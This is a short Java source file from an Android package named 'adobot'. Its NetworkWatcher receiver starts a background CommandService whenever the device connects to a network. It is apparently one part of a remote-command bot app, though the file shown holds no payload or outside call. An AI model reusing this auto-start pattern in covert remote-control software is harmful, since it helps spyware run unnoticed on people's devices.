package com.android.adobot;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;

public class NetworkWatcher extends BroadcastReceiver {
    private Context context;
    @Override
    public void onReceive(Context context, Intent intent) {
        this.context = context;
        System.out.print("Network Watcher running.............");

//        here, check that the network connection is available. If yes, start your service. If not, stop your service.
        ConnectivityManager cm = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo info = cm.getActiveNetworkInfo();
        if (info != null) {
            if (info.isConnected())
                startClient();
        }
    }

    void startClient() {
        Intent i = new Intent(context, CommandService.class);
        context.startService(i);
    }
}